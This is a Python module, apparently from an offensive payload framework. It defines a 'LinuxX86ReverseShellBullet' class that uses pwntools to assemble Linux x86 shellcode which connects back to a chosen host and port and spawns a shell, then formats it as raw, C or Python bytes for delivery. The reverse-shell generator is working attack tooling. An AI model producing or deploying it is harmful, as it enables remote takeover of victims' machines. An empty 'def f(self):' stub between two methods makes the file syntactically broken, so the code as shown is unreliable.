from __future__ import annotations

from typing import ClassVar
from pwn import shellcraft, asm
from .base import Bullet

class LinuxX86ReverseShellBullet(Bullet):
    """
    Linux x86 reverse shell bullet.

    :cvar name: Name of the bullet.
    :cvar description: Description of the bullet.
    :cvar supported_formats: List of supported output formats.
    """

    name: ClassVar[str] = "linux/x86/reverse_shell"
    description: ClassVar[str] = "Linux x86 reverse shell bullet"
    supported_formats: ClassVar[list[str]] = ["raw", "c", "python"]

    def load(self, lhost: str, lport: int) -> bytes:
        """
        Generate the Linux x86 reverse shell shellcode.

        :param lhost: Local host IP address.
        :param lport: Local port number.
        :return: Shellcode as bytes.
        """
        return asm(
            shellcraft.i386.linux.connect(lhost, lport)
            + shellcraft.i386.linux.sh()
        )
    def f(self):
        

    def chamber(self, raw_bullet: bytes, fmt: str = "raw") -> str | bytes:
        """
        Format the shellcode for delivery.

        :param raw_bullet: The raw shellcode bytes.
        :param fmt: Output format ("raw", "c", "python").
        :return: Formatted shellcode.
        :raises ValueError: If the format is unsupported.
        """
        if fmt == "raw":
            return raw_bullet
        if fmt == "c":
            return (
                "unsigned char bullet[] = {"
                + ",".join(f"0x{b:02x}" for b in raw_bullet)
                + "};"
            )
        if fmt == "python":
            return (
                "bullet = b\""
                + "".join(f"\\x{b:02x}" for b in raw_bullet)
                + "\""
            )
        raise ValueError("Unsupported format")
